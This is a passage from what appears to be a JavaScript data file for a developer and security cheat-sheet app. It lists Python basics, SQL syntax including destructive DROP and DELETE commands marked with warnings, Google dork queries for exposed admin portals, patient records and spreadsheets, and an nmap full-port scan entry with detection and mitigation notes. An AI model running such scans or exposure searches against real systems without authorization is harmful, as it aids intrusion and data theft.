    def wrapper(*args, **kwargs):
        return func(*args, **kwargs).upper()
    return wrapper

@shout
def greet(name):
    return f"hi {name}"
print(greet("sam"))              # 'HI SAM'`}},

{id:"py-sort-basics", cat:"Python Examples", title:"Sorting · sort and sorted",
 desc:"sorted() returns a new list; .sort() sorts in place.",
 code:{py:`nums = [3, 1, 2]
print(sorted(nums))     # [1, 2, 3]  new list
print(nums)             # [3, 1, 2]  unchanged
nums.sort()             # in place, returns None
print(nums)             # [1, 2, 3]`}},
{id:"py-sort-reverse", cat:"Python Examples", title:"Sorting · reverse parameter",
 desc:"reverse=True sorts high to low.",
 code:{py:`nums = [1, 2, 3]
print(sorted(nums, reverse=True))    # [3, 2, 1]
words = ["b", "a", "c"]
words.sort(reverse=True)
print(words)                          # ['c', 'b', 'a']`}},
{id:"py-sort-key", cat:"Python Examples", title:"Sorting · key parameter",
 desc:"key= sorts by a computed value for each item.",
 code:{py:`words = ["banana", "kiwi", "apple"]
print(sorted(words, key=len))          # by length
print(sorted(words, key=str.lower))    # case-insensitive`}},
{id:"py-sort-dict", cat:"Python Examples", title:"Sorting · Sorting a dictionary",
 desc:"Sort by key, or sort items() by value.",
 code:{py:`scores = {"Sam": 88, "Ana": 95, "Kim": 72}
print(sorted(scores))          # keys: ['Ana','Kim','Sam']
print(sorted(scores.items(), key=lambda kv: kv[1], reverse=True))`}},
{id:"py-sort-tiebreak", cat:"Python Examples", title:"Sorting · Breaking ties (secondary sort)",
 desc:"A tuple key sorts by the first field, then the second for ties.",
 code:{py:`people = [("Sam", 30), ("Ana", 30), ("Kim", 25)]
# sort by age, then name for ties:
print(sorted(people, key=lambda p: (p[1], p[0])))`}},

{id:"py-nest-complex-items", cat:"Python Examples", title:"Nested data · Lists with complex items",
 desc:"Lists whose items are themselves lists.",
 code:{py:`students = [
    ["Sam", [90, 85]],
    ["Ana", [70, 95]],
]
for name, grades in students:
    print(name, "avg:", sum(grades) / len(grades))`}},
{id:"py-nest-dicts", cat:"Python Examples", title:"Nested data · Nested dictionaries",
 desc:"Dicts of dicts; drill in with chained keys.",
 code:{py:`users = {
    "sam": {"age": 42, "roles": ["admin"]},
    "ana": {"age": 30, "roles": ["user", "dev"]},
}
print(users["ana"]["age"])          # 30
print(users["ana"]["roles"][1])     # 'dev'`}},
{id:"py-nest-json", cat:"Python Examples", title:"Nested data · Processing JSON results",
 desc:"json.loads parses a JSON string into nested dicts/lists.",
 code:{py:`import json
text = '{"name": "Sam", "langs": ["py", "js"], "active": true}'
data = json.loads(text)             # JSON -> Python
print(data["name"])                 # Sam
print(data["langs"][0])             # py
print(json.dumps(data))             # back to a JSON string`}},
{id:"py-nest-iter", cat:"Python Examples", title:"Nested data · Nested iteration",
 desc:"Walk a 2-D structure with nested loops.",
 code:{py:`matrix = [[1, 2, 3], [4, 5, 6]]
for row in matrix:
    for value in row:
        print(value, end=" ")
    print()`}},
{id:"py-nest-copy", cat:"Python Examples", title:"Nested data · Deep vs. shallow copies",
 desc:"A shallow copy shares inner objects; deepcopy duplicates everything.",
 code:{py:`import copy
a = [[1, 2], [3, 4]]
shallow = a[:]                 # inner lists still shared
shallow[0][0] = 99
print(a)                       # [[99, 2], [3, 4]]  <- affected
b = [[1, 2], [3, 4]]
deep = copy.deepcopy(b)        # fully independent
deep[0][0] = 99
print(b)                       # [[1, 2], [3, 4]]  <- safe`}},

{id:"py-test-assert", cat:"Python Examples", title:"Testing · Test cases (assert)",
 desc:"assert raises AssertionError when an expectation is false.",
 code:{py:`def double(x):
    return x * 2
assert double(2) == 4      # passes silently
assert double(0) == 0
print("all tests passed")`}},
{id:"py-test-datatype", cat:"Python Examples", title:"Testing · Checking data-type assumptions",
 desc:"Assert the result is the type you expect.",
 code:{py:`def average(nums):
    return sum(nums) / len(nums)
result = average([2, 4, 6])
assert isinstance(result, float)
print(result)`}},
{id:"py-test-other", cat:"Python Examples", title:"Testing · Checking other assumptions",
 desc:"Assert invariants (ranges, bounds) hold.",
 code:{py:`def clamp(x):
    return max(0, min(100, x))
assert clamp(150) == 100
assert clamp(-5) == 0
assert 0 <= clamp(37) <= 100       # invariant holds
print("ok")`}},
{id:"py-test-conditionals", cat:"Python Examples", title:"Testing · Testing conditionals",
 desc:"Exercise every branch of an if/elif/else.",
 code:{py:`def sign(n):
    if n > 0: return "pos"
    elif n < 0: return "neg"
    else: return "zero"
assert sign(5) == "pos"
assert sign(-5) == "neg"
assert sign(0) == "zero"
print("branches covered")`}},
{id:"py-test-loops", cat:"Python Examples", title:"Testing · Testing loops",
 desc:"Test empty, none-match, and some-match inputs.",
 code:{py:`def count_evens(nums):
    c = 0
    for n in nums:
        if n % 2 == 0: c += 1
    return c
assert count_evens([]) == 0            # empty
assert count_evens([1, 3]) == 0        # none
assert count_evens([2, 4, 5]) == 2     # some
print("loop tests passed")`}},
{id:"py-test-return", cat:"Python Examples", title:"Testing · Return value tests",
 desc:"Assert the returned value for several inputs.",
 code:{py:`def add(a, b):
    return a + b
assert add(2, 3) == 5
assert add(-1, 1) == 0
assert add(0, 0) == 0
print("return values verified")`}},
{id:"py-test-sideeffect", cat:"Python Examples", title:"Testing · Side effect tests",
 desc:"Verify a mutation actually happened.",
 code:{py:`def append_zero(lst):
    lst.append(0)
data = [1, 2]
append_zero(data)
assert data == [1, 2, 0]
print("side effect verified")`}},
{id:"py-test-optional", cat:"Python Examples", title:"Testing · Testing optional parameters",
 desc:"Test both the default and an overridden value.",
 code:{py:`def greet(name, greeting="Hello"):
    return f"{greeting}, {name}"
assert greet("Sam") == "Hello, Sam"          # default
assert greet("Sam", "Hi") == "Hi, Sam"       # override
print("optional params verified")`}},

{id:"py-exc-intro", cat:"Python Examples", title:"Exceptions · Exceptions",
 desc:"An exception interrupts flow when something goes wrong.",
 code:{py:`nums = [1, 2, 3]
try:
    print(nums[10])
except IndexError:
    print("that index doesn't exist")`}},
{id:"py-exc-flow", cat:"Python Examples", title:"Exceptions · try/except flow of control",
 desc:"try runs code; except handles errors; finally always runs.",
 code:{py:`try:
    x = int("not a number")
    print("this line is skipped")
except ValueError:
    print("caught it")
finally:
    print("finally always runs")`}},
{id:"py-exc-raise", cat:"Python Examples", title:"Exceptions · Raising and catching errors (raise)",
 desc:"raise signals an error; the caller can catch it.",
 code:{py:`def withdraw(balance, amount):
    if amount > balance:
        raise ValueError("insufficient funds")
    return balance - amount
try:
    withdraw(50, 100)
except ValueError as e:
    print("error:", e)`}},
{id:"py-exc-standard", cat:"Python Examples", title:"Exceptions · Standard exceptions",
 desc:"Common built-in exception types by name.",
 code:{py:`for call in ["1/0", "int('x')", "[][0]", "undefined_name"]:
    try:
        eval(call)
    except Exception as e:
        print(type(e).__name__, "->", e)
# ZeroDivisionError, ValueError, IndexError, NameError`}},

{id:"py-cls-define", cat:"Python Examples", title:"Classes · User-defined classes",
 desc:"class defines a new type; () creates an instance.",
 code:{py:`class Dog:
    pass              # an empty class (a new type)
d = Dog()             # create an instance
print(type(d))        # <class '__main__.Dog'>`}},
{id:"py-cls-init", cat:"Python Examples", title:"Classes · Constructor / parameters (init)",
 desc:"__init__ runs at creation and sets instance attributes.",
 code:{py:`class Point:
    def __init__(self, x, y):   # runs when you create an instance
        self.x = x
        self.y = y
p = Point(3, 4)
print(p.x, p.y)                 # 3 4`}},
{id:"py-cls-methods", cat:"Python Examples", title:"Classes · Adding methods",
 desc:"Methods take self and act on the instance.",
 code:{py:`class Circle:
    def __init__(self, r):
        self.r = r
    def area(self):
        return 3.14159 * self.r ** 2
c = Circle(2)
print(c.area())                 # 12.566...`}},
{id:"py-cls-obj-args", cat:"Python Examples", title:"Classes · Objects as arguments/parameters",
 desc:"Pass instances into functions like any other value.",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
def distance(a, b):
    return ((a.x - b.x)**2 + (a.y - b.y)**2) ** 0.5
print(distance(Point(0, 0), Point(3, 4)))   # 5.0`}},
{id:"py-cls-str", cat:"Python Examples", title:"Classes · Converting an object to a string (str)",
 desc:"__str__ controls how print() / str() show the object.",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
    def __str__(self):
        return f"({self.x}, {self.y})"
print(Point(3, 4))                     # (3, 4)`}},
{id:"py-cls-return-instance", cat:"Python Examples", title:"Classes · Instances as return values",
 desc:"A function can build and return a new object.",
 code:{py:`class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
    def __str__(self):
        return f"({self.x}, {self.y})"
def midpoint(a, b):
    return Point((a.x + b.x) / 2, (a.y + b.y) / 2)
print(midpoint(Point(0, 0), Point(4, 6)))   # (2.0, 3.0)`}},
{id:"py-cls-sort-instances", cat:"Python Examples", title:"Classes · Sorting lists of instances",
 desc:"Sort objects with a key function on an attribute.",
 code:{py:`class Person:
    def __init__(self, name, age):
        self.name, self.age = name, age
    def __repr__(self):
        return f"{self.name}({self.age})"
people = [Person("Sam", 42), Person("Ana", 30)]
print(sorted(people, key=lambda p: p.age))    # by age`}},
{id:"py-cls-class-vs-instance", cat:"Python Examples", title:"Classes · Class variables vs. instance variables",
 desc:"Class variables are shared; instance variables are per object.",
 code:{py:`class Dog:
    species = "Canis familiaris"     # class variable (shared)
    def __init__(self, name):
        self.name = name             # instance variable (per object)
a, b = Dog("Rex"), Dog("Fido")
print(a.species, b.species)          # shared value
print(a.name, b.name)                # different`}},
{id:"py-cls-private", cat:"Python Examples", title:"Classes · Public and private instance variables",
 desc:"A leading underscore marks an attribute as internal (by convention).",
 code:{py:`class Account:
    def __init__(self, balance):
        self.owner = "Sam"       # public by convention
        self._balance = balance  # _leading underscore = internal
    def deposit(self, amt):
        self._balance += amt
        return self._balance
acct = Account(100)
print(acct.deposit(50))          # 150`}},
{id:"py-cls-test", cat:"Python Examples", title:"Classes · Testing classes",
 desc:"Assert initial state, method returns, and state changes.",
 code:{py:`class Counter:
    def __init__(self):
        self.n = 0
    def bump(self):
        self.n += 1
        return self.n
c = Counter()
assert c.n == 0                  # initial state
assert c.bump() == 1             # method return
assert c.n == 1                  # state changed
print("class tests passed")`}},
{id:"py-cls-decorator", cat:"Python Examples", title:"Classes · Class decorators (property/staticmethod)",
 desc:"@property exposes a method like an attribute; @staticmethod drops self.",
 code:{py:`class Temp:
    def __init__(self, c):
        self._c = c
    @property                     # access like an attribute, no ()
    def fahrenheit(self):
        return self._c * 9 / 5 + 32
    @staticmethod                 # utility on the class, no self
    def freezing():
        return 0
t = Temp(100)
print(t.fahrenheit, Temp.freezing())   # 212.0 0`}},

{id:"py-inh-intro", cat:"Python Examples", title:"Inheritance · Class inheritance",
 desc:"A subclass gets the parent's methods for free.",
 code:{py:`class Animal:
    def breathe(self):
        print("breathing")
class Dog(Animal):        # Dog inherits from Animal
    pass
Dog().breathe()           # inherited method works`}},
{id:"py-inh-subclass", cat:"Python Examples", title:"Inheritance · Defining a subclass",
 desc:"A subclass extends the parent with its own state/behavior.",
 code:{py:`class Shape:
    def __init__(self, name):
        self.name = name
class Square(Shape):
    def __init__(self, side):
        super().__init__("square")
        self.side = side
s = Square(4)
print(s.name, s.side)        # square 4`}},
{id:"py-inh-lookup", cat:"Python Examples", title:"Inheritance · Attribute lookup order",
 desc:"Python searches the instance, then the class, then its parents.",
 code:{py:`class A:
    x = "from A"
class B(A):
    pass
b = B()
print(b.x)         # 'from A'  (found on parent A)
b.x = "on b"       # instance attribute shadows the class one
print(b.x)         # 'on b'`}},
{id:"py-inh-override", cat:"Python Examples", title:"Inheritance · Overriding methods",
 desc:"A subclass can replace a parent method.",
 code:{py:`class Animal:
    def speak(self):
        return "..."
class Cat(Animal):
    def speak(self):           # override
        return "meow"
print(Animal().speak(), Cat().speak())   # ... meow`}},
{id:"py-inh-super", cat:"Python Examples", title:"Inheritance · Invoking the parent method (super)",
 desc:"super() calls the parent's version of a method.",
 code:{py:`class Logger:
    def log(self, msg):
        print("LOG:", msg)
class TimeLogger(Logger):
    def log(self, msg):
        super().log(msg)           # call parent's version
        print("  (also handled here)")
TimeLogger().log("hi")`}},
{id:"py-inh-multiple", cat:"Python Examples", title:"Inheritance · Multiple inheritance",
 desc:"A class can inherit from more than one parent.",
 code:{py:`class Swimmer:
    def move(self): return "swim"
class Flyer:
    def fly(self): return "fly"
class Duck(Swimmer, Flyer):        # inherits from both
    pass
d = Duck()
print(d.move(), d.fly())           # swim fly`}},

{id:"py-fp-map", cat:"Python Examples", title:"Functional · map",
 desc:"Apply a function to every item, producing a new iterable.",
 code:{py:`nums = [1, 2, 3, 4]
squared = list(map(lambda x: x * x, nums))    # apply to each
print(squared)                                 # [1, 4, 9, 16]
print(list(map(str, nums)))                    # ['1','2','3','4']`}},
{id:"py-fp-filter", cat:"Python Examples", title:"Functional · filter",
 desc:"Keep only items for which the function returns True.",
 code:{py:`nums = range(1, 11)
evens = list(filter(lambda x: x % 2 == 0, nums))
print(evens)                                     # [2, 4, 6, 8, 10]`}},
{id:"py-fp-comprehension", cat:"Python Examples", title:"Functional · List comprehensions",
 desc:"Build a list from an expression over an iterable, with an optional filter.",
 code:{py:`print([x * x for x in range(5)])              # [0, 1, 4, 9, 16]
print([x for x in range(10) if x % 2 == 0])   # evens
print([c.upper() for c in "abc"])             # ['A', 'B', 'C']`}},
{id:"py-fp-zip", cat:"Python Examples", title:"Functional · zip",
 desc:"Pair up items from several iterables position by position.",
 code:{py:`names = ["Sam", "Ana", "Kim"]
ages = [42, 30, 25]
for name, age in zip(names, ages):     # pair them up
    print(name, age)
print(dict(zip(names, ages)))          # {'Sam': 42, 'Ana': 30, 'Kim': 25}`}},

/* ================= GOOGLE DORKS ================= */

{id:"dork-inurl", cat:"Google Dorks", title:"inurl:", desc:"Require a term to appear in the page's URL — good for admin paths, login portals, and specific directories.",
 code:{dork:`inurl:admin login portal`}},
{id:"dork-site", cat:"Google Dorks", title:"site:", desc:"Limit results to a single domain or TLD.",
 code:{dork:`site:microsoft.com windows xp end of life`}},
{id:"dork-filetype", cat:"Google Dorks", title:"filetype: / ext:", desc:"Return only one file type. filetype: and ext: behave the same.",
 code:{dork:`filetype:pdf nasa moon landing`}},
{id:"dork-allinurl", cat:"Google Dorks", title:"allinurl:", desc:"Require every following word to appear in the URL (like stacking inurl:).",
 code:{dork:`allinurl:blog wordpress admin`}},
{id:"dork-intext", cat:"Google Dorks", title:"intext: / allintext:", desc:"Match words in the page body; allintext: requires all of the listed words.",
 code:{dork:`intext:"index of /htdocs" patient records`}},
{id:"dork-related", cat:"Google Dorks", title:"related:", desc:"Find sites similar to a given domain. Google's coverage of this operator is now limited.",
 code:{dork:`related:sans.org`}},
{id:"dork-info", cat:"Google Dorks", title:"info:", desc:"Once showed what Google indexed about a URL. Note: Google retired info: (~2019) and cache: (2024) — use the Wayback Machine (web.archive.org) for cached copies.",
 code:{dork:`info:usgs.gov`}},
{id:"dork-link", cat:"Google Dorks", title:"link:", desc:"Historically listed pages linking to a URL. Note: Google removed the link: operator (~2017); use Search Console or a backlink tool instead.",
 code:{dork:`link:example.com/report.pdf`}},
{id:"dork-exact", cat:"Google Dorks", title:`"exact phrase"`, desc:"Double quotes match a phrase verbatim and in order.",
 code:{dork:`"malware hunting"`}},
{id:"dork-plus", cat:"Google Dorks", title:"+word (force exact)", desc:"Force a term with no synonyms or stemming. Google removed the + operator in 2011 — quote the single word instead.",
 code:{dork:`malware "hunter"`}},
{id:"dork-exclude", cat:"Google Dorks", title:"-word (exclude)", desc:"A leading minus drops results (or query terms) containing that word. No space between - and the word.",
 code:{dork:`advanced malware hunting -beginner -introduction`}},
{id:"dork-wildcard", cat:"Google Dorks", title:`"word * word"`, desc:"Inside a quoted phrase, * is a single-word wildcard — matches anything between the two words.",
 code:{dork:`"next * firewalls"`}},
{id:"dork-or", cat:"Google Dorks", title:"OR / |", desc:"Match either term. Use uppercase OR or the pipe character | between terms.",
 code:{dork:`locky OR ransomware`}},
{id:"dork-and", cat:"Google Dorks", title:"AND", desc:"Match both terms. Google already ANDs separate words by default; explicit AND also works. The & character is not a Google operator.",
 code:{dork:`cissp AND certification`}},
{id:"dork-combo", cat:"Google Dorks", title:"Chaining operators (power search)", desc:"Stack operators for precise OSINT — e.g. surface exposed spreadsheets on a domain. Use only against systems you are authorized to assess.",
 code:{dork:`intitle:"index of" (xls | xlsx) intext:budget site:example.com`}},

/* ================= SQL ================= */

/* ---------- querying a table ---------- */
{id:"sql-select-cols", cat:"SQL", title:"SELECT columns", desc:"Return only the named columns from a table.",
 code:{sql:`SELECT c1, c2 FROM t;`}},
{id:"sql-select-all", cat:"SQL", title:"SELECT * (all columns)", desc:"Return every column and row; * means all columns.",
 code:{sql:`SELECT * FROM t;`}},
{id:"sql-where", cat:"SQL", title:"WHERE (filter rows)", desc:"Keep only rows that satisfy a condition.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE condition;`}},
{id:"sql-distinct", cat:"SQL", title:"SELECT DISTINCT", desc:"Drop duplicate rows from the result set.",
 code:{sql:`SELECT DISTINCT c1 FROM t
WHERE condition;`}},
{id:"sql-orderby", cat:"SQL", title:"ORDER BY", desc:"Sort the result set; ASC is the default, DESC reverses it (per column).",
 code:{sql:`SELECT c1, c2 FROM t
ORDER BY c1 ASC;   -- or DESC`}},
{id:"sql-limit", cat:"SQL", title:"LIMIT / OFFSET", desc:"Skip offset rows then return the next n. LIMIT/OFFSET is MySQL/PostgreSQL/SQLite; SQL Server & Oracle use OFFSET ... FETCH.",
 code:{sql:`SELECT c1, c2 FROM t
ORDER BY c1
LIMIT n OFFSET offset;`}},
{id:"sql-groupby", cat:"SQL", title:"GROUP BY (aggregate)", desc:"Collapse rows into groups and apply an aggregate (COUNT, SUM, ...) per group.",
 code:{sql:`SELECT c1, aggregate(c2)
FROM t
GROUP BY c1;`}},
{id:"sql-having", cat:"SQL", title:"HAVING (filter groups)", desc:"Filter groups after aggregation. WHERE filters rows; HAVING filters groups.",
 code:{sql:`SELECT c1, aggregate(c2)
FROM t
GROUP BY c1
HAVING condition;`}},

/* ---------- joining tables ---------- */
{id:"sql-inner-join", cat:"SQL", title:"INNER JOIN", desc:"Rows that have a match in both tables.",
 code:{sql:`SELECT c1, c2
FROM t1
INNER JOIN t2 ON condition;`}},
{id:"sql-left-join", cat:"SQL", title:"LEFT JOIN", desc:"All rows from the left table, plus matches from the right (NULLs where none).",
 code:{sql:`SELECT c1, c2
FROM t1
LEFT JOIN t2 ON condition;`}},
{id:"sql-right-join", cat:"SQL", title:"RIGHT JOIN", desc:"All rows from the right table, plus matches from the left.",
 code:{sql:`SELECT c1, c2
FROM t1
RIGHT JOIN t2 ON condition;`}},
{id:"sql-full-join", cat:"SQL", title:"FULL OUTER JOIN", desc:"All rows from both tables, matched where possible. Note: MySQL has no FULL OUTER JOIN — emulate with LEFT JOIN UNION RIGHT JOIN.",
 code:{sql:`SELECT c1, c2
FROM t1
FULL OUTER JOIN t2 ON condition;`}},
{id:"sql-cross-join", cat:"SQL", title:"CROSS JOIN", desc:"Cartesian product: every row of t1 paired with every row of t2.",
 code:{sql:`SELECT c1, c2
FROM t1
CROSS JOIN t2;`}},
{id:"sql-cross-join2", cat:"SQL", title:"Implicit cross join (comma)", desc:"Comma-separated tables also cross join; add a WHERE to turn it into an equi-join.",
 code:{sql:`SELECT c1, c2
FROM t1, t2;`}},
{id:"sql-self-join", cat:"SQL", title:"Self join", desc:"Join a table to itself using two aliases (e.g. employee -> manager).",
 code:{sql:`SELECT c1, c2
FROM t1 A
INNER JOIN t1 B ON condition;`}},

/* ---------- set operators & predicates ---------- */
{id:"sql-union", cat:"SQL", title:"UNION [ALL]", desc:"Stack rows of two queries (matching column count/types). UNION removes duplicates; UNION ALL keeps them.",
 code:{sql:`SELECT c1, c2 FROM t1
UNION [ALL]
SELECT c1, c2 FROM t2;`}},
{id:"sql-intersect", cat:"SQL", title:"INTERSECT", desc:"Rows present in both result sets.",
 code:{sql:`SELECT c1, c2 FROM t1
INTERSECT
SELECT c1, c2 FROM t2;`}},
{id:"sql-minus", cat:"SQL", title:"MINUS / EXCEPT", desc:"Rows in the first query but not the second. MINUS is Oracle; PostgreSQL/SQL Server/SQLite use EXCEPT.",
 code:{sql:`SELECT c1, c2 FROM t1
MINUS            -- EXCEPT in most databases
SELECT c1, c2 FROM t2;`}},
{id:"sql-like", cat:"SQL", title:"LIKE (pattern match)", desc:"Wildcard match: % = any run of characters, _ = exactly one character.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 LIKE 'a%';   -- starts with a ; use NOT LIKE to negate`}},
{id:"sql-in", cat:"SQL", title:"IN (value list)", desc:"Match any value in a list (or a subquery).",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 IN (1, 2, 3);   -- NOT IN to exclude`}},
{id:"sql-between", cat:"SQL", title:"BETWEEN (range)", desc:"Match values in an inclusive range: low <= c1 <= high.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 BETWEEN low AND high;`}},
{id:"sql-isnull", cat:"SQL", title:"IS [NOT] NULL", desc:"Test for NULL — you cannot compare to NULL with = (NULL = NULL is unknown).",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 IS NULL;   -- or IS NOT NULL`}},

/* ---------- managing tables ---------- */
{id:"sql-create-table", cat:"SQL", title:"CREATE TABLE", desc:"Create a table with typed columns and inline column constraints.",
 code:{sql:`CREATE TABLE t (
  id    INT PRIMARY KEY,
  name  VARCHAR NOT NULL,
  price INT DEFAULT 0
);`}},
{id:"sql-drop-table", cat:"SQL", title:"DROP TABLE", desc:"Delete a table's data and structure from the database.",
 danger:"Permanently removes the table and everything in it.",
 code:{sql:`DROP TABLE t;`}},
{id:"sql-truncate", cat:"SQL", title:"TRUNCATE TABLE", desc:"Remove all rows quickly, keeping the table structure.",
 danger:"Deletes every row; usually cannot be rolled back and resets identity counters.",
 code:{sql:`TRUNCATE TABLE t;`}},
{id:"sql-add-column", cat:"SQL", title:"ALTER TABLE ADD column", desc:"Add a new column to an existing table.",
 code:{sql:`ALTER TABLE t ADD column_name datatype;`}},
{id:"sql-drop-column", cat:"SQL", title:"ALTER TABLE DROP COLUMN", desc:"Remove a column from a table.",
 danger:"Permanently deletes the column and all data it holds.",
 code:{sql:`ALTER TABLE t DROP COLUMN c;`}},
{id:"sql-add-constraint", cat:"SQL", title:"ALTER TABLE ADD constraint", desc:"Attach a constraint (PRIMARY KEY, FOREIGN KEY, UNIQUE, CHECK) to an existing table.",
 code:{sql:`ALTER TABLE t ADD CONSTRAINT constraint_name constraint_definition;`}},
{id:"sql-drop-constraint", cat:"SQL", title:"ALTER TABLE DROP constraint", desc:"Remove a named constraint from a table.",
 code:{sql:`ALTER TABLE t DROP CONSTRAINT constraint_name;`}},
{id:"sql-rename-table", cat:"SQL", title:"Rename a table", desc:"Rename table t1 to t2. (MySQL: RENAME TABLE t1 TO t2.)",
 code:{sql:`ALTER TABLE t1 RENAME TO t2;`}},
{id:"sql-rename-column", cat:"SQL", title:"Rename a column", desc:"Rename column c1 to c2. Some databases spell it ALTER TABLE t RENAME COLUMN c1 TO c2.",
 code:{sql:`ALTER TABLE t1 RENAME c1 TO c2;`}},

/* ---------- constraints ---------- */
{id:"sql-primary-key", cat:"SQL", title:"PRIMARY KEY (composite)", desc:"Uniquely identify each row; a composite key spans several columns and implies NOT NULL.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  c3 VARCHAR,
  PRIMARY KEY (c1, c2)
);`}},
{id:"sql-foreign-key", cat:"SQL", title:"FOREIGN KEY", desc:"Enforce referential integrity by pointing a column at another table's key.",
 code:{sql:`CREATE TABLE t1 (
  c1 INT PRIMARY KEY,
  c2 INT,
  FOREIGN KEY (c2) REFERENCES t2 (c2)
);`}},
{id:"sql-unique", cat:"SQL", title:"UNIQUE", desc:"Require the value (or combination of columns) to be unique across rows.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  UNIQUE (c2, c3)
);`}},
{id:"sql-check", cat:"SQL", title:"CHECK", desc:"Reject any row that fails a boolean condition.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  CHECK (c1 > 0 AND c1 >= c2)
);`}},
{id:"sql-not-null", cat:"SQL", title:"NOT NULL", desc:"Require a column to always hold a value.",
 code:{sql:`CREATE TABLE t (
  c1 INT PRIMARY KEY,
  c2 VARCHAR NOT NULL
);`}},

/* ---------- modifying data ---------- */
{id:"sql-insert-one", cat:"SQL", title:"INSERT one row", desc:"Add a single row to a table.",
 code:{sql:`INSERT INTO t (column_list)
VALUES (value_list);`}},
{id:"sql-insert-many", cat:"SQL", title:"INSERT multiple rows", desc:"Add several rows in a single statement.",
 code:{sql:`INSERT INTO t (column_list)
VALUES
  (value_list),
  (value_list),
  (value_list);`}},
{id:"sql-insert-select", cat:"SQL", title:"INSERT ... SELECT", desc:"Insert rows produced by a query over another table.",
 code:{sql:`INSERT INTO t1 (column_list)
SELECT column_list
FROM t2;`}},
{id:"sql-update-where", cat:"SQL", title:"UPDATE (with WHERE)", desc:"Change columns only in rows that match the condition.",
 code:{sql:`UPDATE t
SET c1 = new_value,
    c2 = new_value
WHERE condition;`}},
{id:"sql-update-all", cat:"SQL", title:"UPDATE all rows", desc:"Set a column for every row in the table.",
 danger:"No WHERE clause — this changes every row.",
 code:{sql:`UPDATE t
SET c1 = new_value;`}},
{id:"sql-delete-where", cat:"SQL", title:"DELETE (with WHERE)", desc:"Delete only the rows matching a condition.",
 code:{sql:`DELETE FROM t
WHERE condition;`}},
{id:"sql-delete-all", cat:"SQL", title:"DELETE all rows", desc:"Delete every row while keeping the table structure.",
 danger:"No WHERE clause — this empties the whole table.",
 code:{sql:`DELETE FROM t;`}},

/* ---------- views ---------- */
{id:"sql-create-view", cat:"SQL", title:"CREATE VIEW", desc:"Save a query as a virtual table you can SELECT from.",
 code:{sql:`CREATE VIEW v (c1, c2) AS
SELECT c1, c2
FROM t;`}},
{id:"sql-view-check-option", cat:"SQL", title:"CREATE VIEW ... WITH CHECK OPTION", desc:"A view that rejects INSERT/UPDATE which would produce rows outside its WHERE clause.",
 code:{sql:`CREATE VIEW v (c1, c2) AS
SELECT c1, c2
FROM t
WITH [CASCADED | LOCAL] CHECK OPTION;`}},
{id:"sql-recursive-view", cat:"SQL", title:"CREATE RECURSIVE VIEW", desc:"A view defined in terms of itself (anchor + recursive part). Most engines use a WITH RECURSIVE CTE instead.",
 code:{sql:`CREATE RECURSIVE VIEW v AS
  select_statement        -- anchor part
UNION [ALL]
  select_statement;       -- recursive part`}},
{id:"sql-temp-view", cat:"SQL", title:"CREATE TEMPORARY VIEW", desc:"A view scoped to the current session; it disappears on disconnect.",
 code:{sql:`CREATE TEMPORARY VIEW v AS
SELECT c1, c2
FROM t;`}},
{id:"sql-drop-view", cat:"SQL", title:"DROP VIEW", desc:"Delete a view. The underlying table data is untouched.",
 code:{sql:`DROP VIEW view_name;`}},

/* ---------- indexes ---------- */
{id:"sql-create-index", cat:"SQL", title:"CREATE INDEX", desc:"Speed up lookups/sorts on one or more columns (at the cost of slower writes).",
 code:{sql:`CREATE INDEX idx_name
ON t (c1, c2);`}},
{id:"sql-unique-index", cat:"SQL", title:"CREATE UNIQUE INDEX", desc:"An index that also enforces uniqueness on the indexed columns.",
 code:{sql:`CREATE UNIQUE INDEX idx_name
ON t (c3, c4);`}},
{id:"sql-drop-index", cat:"SQL", title:"DROP INDEX", desc:"Remove an index. Syntax varies (some need ON table).",
 code:{sql:`DROP INDEX idx_name;`}},

/* ---------- triggers & aggregates ---------- */
{id:"sql-create-trigger", cat:"SQL", title:"CREATE TRIGGER", desc:"Run a stored procedure automatically on a table event. 'MODIFY' isn't standard — most engines use CREATE OR REPLACE / CREATE OR ALTER.",
 code:{sql:`CREATE OR REPLACE TRIGGER trigger_name
  { BEFORE | AFTER }             -- when
  { INSERT | UPDATE | DELETE }   -- event
  ON table_name
  FOR EACH ROW                   -- or FOR EACH STATEMENT
EXECUTE stored_procedure;`}},
{id:"sql-trigger-example", cat:"SQL", title:"CREATE TRIGGER (example)", desc:"Fire a procedure before each new row is inserted into person.",
 code:{sql:`CREATE TRIGGER before_insert_person
BEFORE INSERT
ON person FOR EACH ROW
EXECUTE stored_procedure;`}},
{id:"sql-drop-trigger", cat:"SQL", title:"DROP TRIGGER", desc:"Delete a trigger.",
 code:{sql:`DROP TRIGGER trigger_name;`}},
{id:"sql-aggregates", cat:"SQL", title:"Aggregate functions", desc:"AVG, COUNT, SUM, MIN, MAX summarize a set of rows — usually paired with GROUP BY.",
 code:{sql:`SELECT
  COUNT(*) AS row_count,
  AVG(c2)  AS average,
  SUM(c2)  AS total,
  MIN(c2)  AS smallest,
  MAX(c2)  AS largest
FROM t;`}},

/* ================= RECONNAISSANCE ================= */
{id:"recon-nmap-sweep", cat:"Reconnaissance", title:"Service & version scan",
 desc:"Fingerprint open ports, services, and versions on a host or subnet. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["network","recon","quick-win"], attack:["T1046"],
 detect:"IDS/flow logs show many ports from one source in a short window; alert on scan signatures (e.g. Suricata ET SCAN).",
 mitigate:"Rate-limit and segment networks; restrict management ports; monitor east-west traffic.",
 code:{
  linux:`nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`,
  mac:`nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`,
  ps:`# requires nmap in PATH
nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`
 }},

/* --- host discovery & port scanning --- */
{id:"recon-host-discovery", cat:"Reconnaissance", title:"Live-host discovery (no port scan)",
 desc:"Find responsive hosts on a subnet via ICMP/ARP without scanning ports. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
